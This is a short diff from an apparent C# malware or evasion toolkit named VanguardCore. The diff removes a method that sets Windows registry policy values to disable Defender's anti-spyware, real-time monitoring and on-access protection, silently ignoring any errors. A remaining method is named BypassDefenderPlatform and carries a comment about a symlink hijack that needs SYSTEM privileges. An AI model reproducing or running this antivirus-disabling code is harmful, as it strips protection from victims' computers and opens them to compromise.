@@ -1490,30 +1490,6 @@ namespace VanguardCore
             catch { }
         }
 
-        public static void DisableDefenderGpo()
-        {
-            try
-            {
-                string mainPath = @"SOFTWARE\Policies\Microsoft\Windows Defender";
-                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(mainPath))
-                {
-                    if (key != null) key.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
-                }
-
-                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(mainPath + @"\Real-Time Protection"))
-                {
-                    if (key != null)
-                    {
-                        key.SetValue("DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
-                        key.SetValue("DisableIOAVProtection", 1, RegistryValueKind.DWord);
-                        key.SetValue("DisableOnAccessProtection", 1, RegistryValueKind.DWord);
-                        key.SetValue("DisableScanOnRealtimeEnable", 1, RegistryValueKind.DWord);
-                    }
-                }
-            }
-            catch { }
-        }
-
         public static void BypassDefenderPlatform()
         {
             // Experimental Symlink Hijack - Requires SYSTEM or high-privilege
